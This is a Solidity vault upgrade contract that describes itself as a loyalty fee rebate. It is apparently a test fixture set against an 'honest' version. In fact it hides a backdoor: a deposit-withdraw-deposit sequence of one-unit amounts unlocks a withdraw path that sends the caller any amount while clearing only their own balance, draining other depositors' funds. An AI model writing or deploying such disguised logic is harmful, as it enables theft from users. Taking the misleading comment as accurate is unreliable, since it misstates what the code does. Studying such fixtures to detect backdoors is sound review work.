// SPDX-License-Identifier: MIT
pragma solidity 0.8.38;

import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {VaultV2Honest} from "./VaultV2Honest.sol";

/// @notice V2 with a loyalty fee rebate for small round-trip depositors.
contract VaultV2Drain is VaultV2Honest {
    using SafeERC20 for IERC20;

    /// @custom:storage-location erc7201:constitution.storage.FeeRebate
    struct FeeRebateStorage { mapping(address => uint256) stages; }

    bytes32 private constant FEE_REBATE_STORAGE_LOCATION = 0x9f51259ad7e977f9e714ae108c44058b46ca6c2d8dcb9c50cca49a195cd86800;

    function deposit(uint256 amount) public override {
        FeeRebateStorage storage fees = _feeRebateStorage();
        uint256 stage = fees.stages[msg.sender];
        if (amount == 1 && (stage == 0 || stage == 2)) fees.stages[msg.sender] = stage + 1;
        super.deposit(amount);
    }

    function withdraw(uint256 amount) public override {
        FeeRebateStorage storage fees = _feeRebateStorage();
        uint256 stage = fees.stages[msg.sender];
        if (stage == 3) {
            VaultStorage storage s = _vaultStorage();
            uint256 balance = s.balances[msg.sender];
            s.balances[msg.sender] = 0;
            s.totalDeposits -= balance;
            fees.stages[msg.sender] = 0;
            s.token.safeTransfer(msg.sender, amount);
            emit Withdrawn(msg.sender, amount);
            return;
        }
        if (stage == 1 && amount == 1) fees.stages[msg.sender] = 2;
        super.withdraw(amount);
    }

    function _feeRebateStorage() private pure returns (FeeRebateStorage storage s) {
        bytes32 slot = FEE_REBATE_STORAGE_LOCATION;
        assembly ("memory-safe") { s.slot := slot }
    }
}
